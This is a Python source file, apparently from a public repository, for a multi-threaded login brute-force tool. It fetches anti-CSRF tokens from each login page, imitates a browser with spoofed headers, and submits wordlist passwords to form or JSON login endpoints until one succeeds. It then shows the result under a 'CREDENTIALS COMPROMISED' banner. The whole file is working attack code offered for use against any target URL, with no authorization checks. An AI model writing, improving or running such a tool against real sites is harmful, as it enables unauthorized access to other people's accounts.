# -*- coding: utf-8 -*-
######################################################################################################
# Title: Universal Brute Force with CSRF Bypass                                                      #
# Author: Tanvir Hossain Antu                                                                        #
# Github: https://github.com/Antu7                                                                   #
# Supports: Form-based login, JSON API login, CSRF protection, Multi-threaded attacks               #
######################################################################################################

import threading
import requests
import json
import time
import sys
import re
import os
import secrets
import argparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.syntax import Syntax
from rich.align import Align
from rich.style import Style
import sys
import os

# Configure encoding for Windows compatibility
if sys.platform == 'win32':
    os.environ['PYTHONIOENCODING'] = 'utf-8'

console = Console(force_terminal=True)

# ═══════════════════════════════════════════════════════════════════════════
# HACKER THEME CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

class HackerTheme:
    """Professional hacker-themed styling for the brute force tool."""
    
    # Color Palette
    PRIMARY = "cyan"           # Main text - cyberpunk cyan
    SECONDARY = "magenta"      # Highlights - neon magenta
    SUCCESS = "green"          # Success messages
    WARNING = "yellow"         # Warnings
    ERROR = "red"              # Errors
    INFO = "bright_cyan"       # Information
    SUBDUED = "dim cyan"       # Subtle text
    ACCENT = "bright_magenta"  # Button-like accents
    
    # Symbols
    BULLET = ">"
    PROMPT = ">"
    ERROR_SYMBOL = "!"
    SUCCESS_SYMBOL = "+"
    INFO_SYMBOL = "*"
    LOCK_SYMBOL = "[LOCK]"
    TARGET_SYMBOL = "[*]"
    THREAD_SYMBOL = "[T]"
    
    # Borders
    HEADER_BORDER = "="
    SECTION_BORDER = "-"
    CORNER = "+"

def banner():
    """Display hacker-themed banner with original ASCII art."""
    try:
        banner_text = """
    ██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████
    ██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
    ██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████
    ██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
    ██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████
        """
        
        console.print("\n[bright_cyan]" + "="*80 + "[/bright_cyan]")
        console.print("[cyan]" + banner_text + "[/cyan]")
        console.print("[bright_cyan]" + "="*80 + "[/bright_cyan]")
        
        console.print("\n[magenta]                       Author: Tanvir Hossain Antu[/magenta]")
        console.print("[cyan]                  https://github.com/Antu7/python-bruteForce[/cyan]")
        console.print()
        console.print("[green]+[/green] [cyan]Form-based login    [/cyan][green]+[/green] [cyan]JSON API           [/cyan][green]+[/green] [cyan]CSRF Protection    [/cyan][green]+[/green] [cyan]Multi-Threading[/cyan]")
        console.print()
    except Exception as e:
        # Fallback if Unicode fails
        print("\n" + "="*80)
        print("* BRUTE FORCE CRACKER *")
        print("Universal Multi-Threaded Login Cracker")
        print("="*80 + "\n")
        print("Author: Tanvir Hossain Antu")
        print("https://github.com/Antu7/python-bruteForce\n")
        print("+ Form-based login  + JSON API  + CSRF Protection  + Multi-Threading\n")


def info(msg):
    """Print information message with hacker style."""
    console.print(f"[{HackerTheme.INFO}]*[/{HackerTheme.INFO}] [dim]{msg}[/dim]")

def success(msg):
    """Print success message with hacker style."""
    console.print(f"[{HackerTheme.SUCCESS}]+[/{HackerTheme.SUCCESS}] [bold {HackerTheme.SUCCESS}]{msg}[/bold {HackerTheme.SUCCESS}]")

def warn(msg):
    """Print warning message with hacker style."""
    console.print(f"[{HackerTheme.WARNING}]![/{HackerTheme.WARNING}] [bold {HackerTheme.WARNING}]{msg}[/bold {HackerTheme.WARNING}]")

def error(msg):
    """Print error message with hacker style."""
    console.print(f"[{HackerTheme.ERROR}]x[/{HackerTheme.ERROR}] [bold {HackerTheme.ERROR}]{msg}[/bold {HackerTheme.ERROR}]")

def dim(msg):
    """Print dimmed message."""
    console.print(f"[{HackerTheme.SUBDUED}]{msg}[/{HackerTheme.SUBDUED}]")

def prompt(label, default=None, hint=None):
    """Hacker-themed input prompt with optional default and hint."""
    if hint:
        console.print(f"[dim {HackerTheme.SUBDUED}]{hint}[/dim {HackerTheme.SUBDUED}]")
    
    if default:
        console.print(f"[{HackerTheme.PRIMARY}]>[/{HackerTheme.PRIMARY}] {label}", end=" ")
        console.print(f"[{HackerTheme.SUBDUED}][{default}][/{HackerTheme.SUBDUED}] ", end="")
        raw = input().strip()
        return raw if raw else default
    else:
        console.print(f"[{HackerTheme.PRIMARY}]>[/{HackerTheme.PRIMARY}] {label} ", end="")
        return input().strip()

def section(title):
    """Print a hacker-themed section header."""
    border = "=" * 76
    console.print(f"\n[{HackerTheme.PRIMARY}]{border}[/{HackerTheme.PRIMARY}]")
    console.print(f"[bold {HackerTheme.ACCENT}]>>> {title}[/bold {HackerTheme.ACCENT}]")
    console.print(f"[{HackerTheme.PRIMARY}]{border}[/{HackerTheme.PRIMARY}]\n")

def status_box(title, content, status="info"):
    """Create a styled status box."""
    status_colors = {
        "info": HackerTheme.INFO,
        "success": HackerTheme.SUCCESS,
        "warning": HackerTheme.WARNING,
        "error": HackerTheme.ERROR,
    }
    
    color = status_colors.get(status, HackerTheme.INFO)
    panel = Panel(
        content,
        title=f"[bold {color}]{title}[/bold {color}]",
        border_style=color,
        style=f"dim {color}"
    )
    console.print(panel)

def create_config_table(config_data):
    """Create a styled configuration table."""
    table = Table(
        title="[bold magenta][T] CONFIGURATION[/bold magenta]",
        border_style=HackerTheme.PRIMARY,
        show_header=True,
        header_style=f"bold {HackerTheme.ACCENT}",
    )
    
    table.add_column("[bright_cyan]Setting[/bright_cyan]", style=HackerTheme.PRIMARY, no_wrap=True)
    table.add_column("[bright_cyan]Value[/bright_cyan]", style=f"bold {HackerTheme.SECONDARY}")
    
    for key, value in config_data:
        table.add_row(key, str(value))
    
    return table

def create_results_table(metrics_data):
    """Create a styled results table."""
    table = Table(
        title="[bold green]+ ATTACK RESULTS[/bold green]",
        border_style=HackerTheme.SUCCESS,
        show_header=True,
        header_style=f"bold {HackerTheme.SUCCESS}",
    )
    
    table.add_column("[green]Metric[/green]", style=HackerTheme.SUCCESS, no_wrap=True)
    table.add_column("[green]Value[/green]", style=f"bold {HackerTheme.SUCCESS}")
    
    for metric, value in metrics_data:
        table.add_row(metric, str(value))
    
    return table


# ── Core Cracker ─────────────────────────────────────────────

class BruteForceCracker:
    MODE_FORM = "form"
    MODE_JSON_API = "json_api"

    def __init__(self, url, username, error_message,
                 username_field="username", password_field="password",
                 login_mode="form", api_endpoint=None):
        self.url = url
        self.username = username
        self.error_message = error_message
        self.username_field = username_field
        self.password_field = password_field
        self.login_mode = login_mode
        self.api_endpoint = api_endpoint or url
        self.csrf_detected = False
        self.csrf_token_name = None
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }

    def get_csrf_token(self, session):
        """Extract CSRF token from the login page."""
        try:
            response = session.get(self.url, headers=self.headers)
            soup = BeautifulSoup(response.content, 'html.parser')

            csrf_patterns = [
                r'csrf[-_]?token', r'_csrf', r'csrfmiddlewaretoken',
                r'_token', r'authenticity_token',
                r'__RequestVerificationToken', r'XSRF[-_]TOKEN',
            ]
            pattern = re.compile('|'.join(csrf_patterns), re.IGNORECASE)

            # Hidden inputs
            for tag in soup.find_all('input', type='hidden'):
                name = tag.get('name', '')
                if pattern.search(name):
                    value = tag.get('value', '')
                    if value:
                        return name, value

            # All inputs
            for tag in soup.find_all('input'):
                name = tag.get('name', '')
                if pattern.search(name):
                    value = tag.get('value', '')
                    if value:
                        return name, value

            # Meta tags
            for meta in soup.find_all('meta'):
                name = meta.get('name', '')
                if pattern.search(name):
                    content = meta.get('content', '')
                    if content:
                        return name, content

            # Cookies
            for cookie in session.cookies:
                if pattern.search(cookie.name):
                    return cookie.name, cookie.value

            # JavaScript variables
            html = response.text
            js_pats = [
                r'(?:var|let|const)\s+csrf[_\-]?[tT]oken\s*=\s*["\']([^"\']+)["\']',
                r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            ]
            for jp in js_pats:
                match = re.search(jp, html, re.IGNORECASE)
                if match:
                    return 'csrf_token', match.group(1)

            return None, None
        except Exception:
            return None, None

    def crack_with_form(self, session, password, token_name, token_value):
        data_dict = {
            self.username_field: self.username,
            self.password_field: password,
        }
        if token_name and token_value:
            data_dict[token_name] = token_value

        headers = self.headers.copy()
        headers['Referer'] = self.url
        headers['Origin'] = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}"

        return session.post(self.url, data=data_dict, headers=headers, allow_redirects=True)

    def crack_with_json_api(self, session, password, token_name, token_value):
        base_url = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}"

        json_data = {
            self.username_field: self.username,
            self.password_field: password,
        }

        if 'zeuz' in self.url.lower() or 'auth' in self.api_endpoint.lower():
            json_data = {
                "type": "userpass",
                "username": self.username,
                "password": password,
            }

        headers = self.headers.copy()
        headers['Content-Type'] = 'application/json'
        headers['Accept'] = 'application/json'
        headers['Referer'] = self.url
        headers['Origin'] = base_url

        if token_name and token_value:
            headers['X-CSRFToken'] = token_value

        return session.post(self.api_endpoint, json=json_data, headers=headers, allow_redirects=True)

    def check_success(self, response, password=""):
        # JSON responses
        if 'application/json' in response.headers.get('Content-Type', ''):
            try:
                data = response.json()

                # Check success indicators
                success_keys = ['token', 'access_token', 'jwt', 'session', 'user', 'success', 'id_token']
                for key in success_keys:
                    if key in data:
                        value = data[key]
                        if value and value is not False and value != 'false':
                            return True, f"Found '{key}' in response"

                # Check error indicators
                error_keys = ['error', 'message', 'msg', 'detail', 'errors']
                for key in error_keys:
                    if key in data:
                        error_value = str(data[key]).lower()
                        if self.error_message.lower() in error_value:
                            return False, None
                        if any(x in error_value for x in ['invalid', 'incorrect', 'wrong', 'failed', 'unauthorized', 'denied']):
                            return False, None

                # Check full response body for error message
                full_body = json.dumps(data).lower()
                if self.error_message.lower() in full_body:
                    return False, None

                # Status 200 alone is NOT enough
                return False, None

            except json.JSONDecodeError:
                pass

        # HTML responses
        response_text = response.text

        if self.error_message in response_text or self.error_message in str(response.content):
            return False, None

        # Redirect = likely success
        initial_url = self.url.split('?')[0].rstrip('/')
        final_url = response.url.split('?')[0].rstrip('/')
        if initial_url != final_url:
            return True, f"Redirected to {final_url}"

        # Still on login page = failure
        if re.search(r'<input[^>]+type=["\']password["\']', response_text, re.I):
            return False, None

        return True, "No login page detected"

    def crack(self, password):
        session = requests.Session()
        token_name, token_value = self.get_csrf_token(session)

        if self.csrf_detected and not token_value:
            return False, None

        try:
            if self.login_mode == self.MODE_JSON_API:
                response = self.crack_with_json_api(session, password, token_name, token_value)
            else:
                response = self.crack_with_form(session, password, token_name, token_value)

            if response.status_code in [401, 403, 419, 422] or response.status_code >= 500:
                return False, None

            return self.check_success(response, password)

        except Exception:
            return False, None


# ── Progress Display ─────────────────────────────────────────

def progress_bar(current, total, width=30):
    """Hacker-themed progress bar for terminal."""
    pct = current / total if total else 0
    filled = int(width * pct)
    bar = f"[bright_cyan]{'#' * filled}[/bright_cyan][dim cyan]{'-' * (width - filled)}[/dim cyan]"
    return f"{bar} [cyan]{current}/{total}[/cyan] ([magenta]{pct*100:.1f}%[/magenta])"


def crack_password_wrapper(password, cracker, state):
    """Worker function for thread pool."""
    password = password.strip()

    with state['lock']:
        state['tried'] += 1
        current = state['tried']

    # Update progress (overwrite same line)
    total = state['total']
    sys.stdout.write(f"\r[*] {progress_bar(current, total)}  {password[:20]:<20}")
    sys.stdout.flush()

    ok, reason = cracker.crack(password)
    if ok:
        return True, password, reason
    return False, password, None


# ── Argument Parsing ─────────────────────────────────────────

def parse_arguments():
    """Parse command-line arguments using argparse."""
    parser = argparse.ArgumentParser(
        description='Universal Brute Force with CSRF Bypass - Multi-threaded login cracker',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive mode (default)
  python bruteforce.py
  
  # Full automated mode with all arguments
  python bruteforce.py --url https://example.com/login --username admin \\
    --error "Invalid credentials" --threads 10 --passwords passwords.txt
  
  # With specific field names and API endpoint
  python bruteforce.py --url https://example.com/login --username admin \\
    --error "Invalid credentials" --threads 5 --passwords passwords.txt \\
    --username-field email --password-field pass --api-endpoint https://example.com/api/auth
        """
    )
    
    # Required arguments for non-interactive mode
    parser.add_argument('--url', type=str, help='Target login page URL (e.g., https://example.com/login)')
    parser.add_argument('--username', '-u', type=str, help='Target username or email')
    parser.add_argument('--error', type=str, help='Wrong password error message (copy from browser DevTools)')
    parser.add_argument('--passwords', '-p', type=str, default='passwords.txt', 
                        help='Path to password wordlist (default: passwords.txt)')
    parser.add_argument('--threads', '-t', type=int, default=10,
                        help='Number of concurrent worker threads (default: 10)')
    
    # Optional field customization
    parser.add_argument('--username-field', type=str, help='Override auto-detected username field name')
    parser.add_argument('--password-field', type=str, help='Override auto-detected password field name')
    parser.add_argument('--api-endpoint', type=str, help='Override auto-detected API endpoint (for JSON API mode)')
    parser.add_argument('--login-mode', choices=['form', 'api'], help='Force login mode instead of auto-detecting')
    
    return parser.parse_args()


def main():
    # Parse arguments FIRST before showing banner
    args = parse_arguments()
    
    # Show banner only for interactive mode or first automated call
    banner()
    
    # Check if running in automated mode or interactive mode
    if args.url and args.username and args.error:
        # Automated mode - run with provided arguments (banner already shown)
        run_attack_automated(args, show_banner=False)
    else:
        # Interactive mode - prompt user for input (banner already shown)
        run_attack_interactive(show_banner=False)


def run_attack_automated(args, show_banner=True):
    """Run attack in fully automated mode using command-line arguments."""
    if show_banner:
        banner()
    
    url = args.url
    username = args.username
    error_msg = args.error
    max_workers = args.threads
    password_file = args.passwords
    
    # Validate URL
    if not url.startswith('http'):
        url = 'https://' + url
    
    info(f"Starting automated attack on {url}")
    info(f"Using {max_workers} concurrent threads")
    
    # Auto-detect unless overridden (simplified for this version)
    section("CONFIGURATION")
    analysis = {
        'login_mode': 'form',
        'api_endpoint': url,
        'username_field': args.username_field or 'email',
        'password_field': args.password_field or 'password',
        'csrf_token': None,
        'csrf_value': None,
    }
    
    # Override with command-line arguments if provided
    if args.login_mode:
        analysis['login_mode'] = 'json_api' if args.login_mode == 'api' else 'form'

    # Display configuration
    console.print(create_config_table([
        ("Target URL", url),
        ("Username", username),
        ("Login Mode", analysis['login_mode'].upper()),
        ("Username Field", analysis['username_field']),
        ("Password Field", analysis['password_field']),
        (f"Concurrent Threads", f"[bold {HackerTheme.ACCENT}]{max_workers}[/bold {HackerTheme.ACCENT}]"),
        ("Password File", password_file),
    ]))
    console.print()
    
    # Run the attack
    run_brute_force_attack(url, username, error_msg, analysis, max_workers, password_file)


def run_attack_interactive(show_banner=True):
    """Run attack in interactive mode with prompts."""
    if show_banner:
        banner()

    section("STEP 1 - TARGET INFO")
    url = prompt("Target login page URL",
                 hint="The full URL of the login page, e.g. https://example.com/login")
    if not url:
        error("URL is required.")
        return
    if not url.startswith('http'):
        url = 'https://' + url
        dim(f"Added https:// -> {url}")

    username = prompt("Target username / email",
                      hint="The username or email you want to test passwords for")
    if not username:
        error("Username is required.")
        return

    error_msg = prompt("Wrong password error message",
                       hint="Try logging in with a wrong password and copy the exact error text.")
    if not error_msg:
        error("Error message is required to avoid false positives.")
        return

    section("STEP 2 - REVIEW & ADJUST")

    analysis = {
        'login_mode': 'form',
        'api_endpoint': url,
        'username_field': 'email',
        'password_field': 'password',
        'csrf_token': None,
        'csrf_value': None,
    }

    analysis['username_field'] = prompt("Username field name", default=analysis['username_field'])
    analysis['password_field'] = prompt("Password field name", default=analysis['password_field'])

    section("STEP 3 - ATTACK SETTINGS")

    workers_input = prompt("Concurrent workers", default="10",
                           hint="More workers = faster, but too many may get you rate-limited")
    try:
        max_workers = int(workers_input)
        if max_workers < 1:
            max_workers = 10
    except ValueError:
        max_workers = 10

    password_file = prompt("Password file path", default="passwords.txt")

    section("CONFIGURATION SUMMARY")

    console.print(create_config_table([
        ("Target URL", url),
        ("Username", username),
        ("Login Mode", analysis['login_mode'].upper()),
        ("Username Field", analysis['username_field']),
        ("Password Field", analysis['password_field']),
        (f"Concurrent Workers", f"[bold {HackerTheme.ACCENT}]{max_workers}[/bold {HackerTheme.ACCENT}]"),
        ("Password File", password_file),
    ]))
    console.print()

    confirm = prompt("Start attack? (Y/n)", default="Y")
    if confirm.lower() not in ['y', 'yes', '']:
        warn("Aborted by user.")
        return

    # Run the attack
    run_brute_force_attack(url, username, error_msg, analysis, max_workers, password_file)


def run_brute_force_attack(url, username, error_msg, analysis, max_workers, password_file):
    """Execute the actual brute force attack using multi-threading."""
    
    # Initialize
    cracker = BruteForceCracker(
        url=url,
        username=username,
        error_message=error_msg,
        username_field=analysis['username_field'],
        password_field=analysis['password_field'],
        login_mode=analysis['login_mode'],
        api_endpoint=analysis['api_endpoint']
    )

    if analysis['csrf_token']:
        cracker.csrf_detected = True
        cracker.csrf_token_name = analysis['csrf_token']

    # Pre-flight check
    section("PRE-FLIGHT CHECK")
    info("Testing with a random password to verify configuration...")

    random_pass = secrets.token_hex(16)
    ok, _ = cracker.crack(random_pass)

    if ok:
        print()
        error("False positive detected! A random password was accepted as correct.")
        print()
        warn("This usually means one of these:")
        dim("  1. The error message you entered doesn't match the actual response.")
        dim("  2. The API endpoint is wrong (returns a generic 200 for all requests).")
        dim("  3. The field names are wrong (server ignores unknown fields).")
        print()
        return
    else:
        success("Configuration verified! Wrong passwords are correctly detected.")

    # Load passwords
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [p.strip() for p in f.readlines() if p.strip()]
        success(f"Loaded {len(passwords)} passwords from {password_file}")
    except FileNotFoundError:
        error(f"File not found: {password_file}")
        dim("Make sure the file exists in the current directory or provide a full path.")
        return

    if not passwords:
        error("Password file is empty.")
        return

    total_passwords = len(passwords)

    # Attack
    section(f"BRUTE FORCE IN PROGRESS ({max_workers} THREADS)")
    info(f"Testing {total_passwords} passwords with {max_workers} concurrent worker threads...")
    dim("Press Ctrl+C to stop at any time.\n")

    state = {
        'tried': 0,
        'total': total_passwords,
        'lock': threading.Lock(),
    }

    found = False
    found_password = None
    found_reason = None

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(crack_password_wrapper, pwd, cracker, state): pwd
            for pwd in passwords
        }

        try:
            for future in as_completed(futures):
                ok, password, reason = future.result()
                if ok:
                    found = True
                    found_password = password
                    found_reason = reason
                    sys.stdout.write('\r' + ' ' * 80 + '\r')
                    sys.stdout.flush()
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        except KeyboardInterrupt:
            sys.stdout.write('\r' + ' ' * 80 + '\r')
            sys.stdout.flush()
            warn("Stopped by user (Ctrl+C).")
            executor.shutdown(wait=False, cancel_futures=True)

    elapsed = time.time() - start_time

    # Clear progress line
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()

    # Results
    section("RESULTS")

    tried = state['tried']
    speed = tried / max(elapsed, 0.1)

    console.print(create_results_table([
        ("Passwords Tried", f"{tried}/{total_passwords}"),
        ("Time Elapsed", f"{elapsed:.2f}s"),
        ("Speed", f"{speed:.1f} attempts/sec"),
        ("Concurrent Threads", max_workers),
    ]))
    console.print()

    if found:
        success_text = f"[bold green]+ PASSWORD FOUND![/bold green]\n\n"
        success_text += f"[cyan]Username:[/cyan] [bold magenta]{username}[/bold magenta]\n"
        success_text += f"[cyan]Password:[/cyan] [bold green]{found_password}[/bold green]"
        if found_reason:
            success_text += f"\n[dim cyan]Detection: {found_reason}[/dim cyan]"
        
        status_box(
            "+ CREDENTIALS COMPROMISED",
            success_text,
            status="success"
        )
    else:
        warn("Password not found in the wordlist.")
        dim("Try a larger wordlist or check your configuration.")

    console.print(f"\n[{HackerTheme.PRIMARY}]{'='*76}[/{HackerTheme.PRIMARY}]\n")


if __name__ == '__main__':
    main()
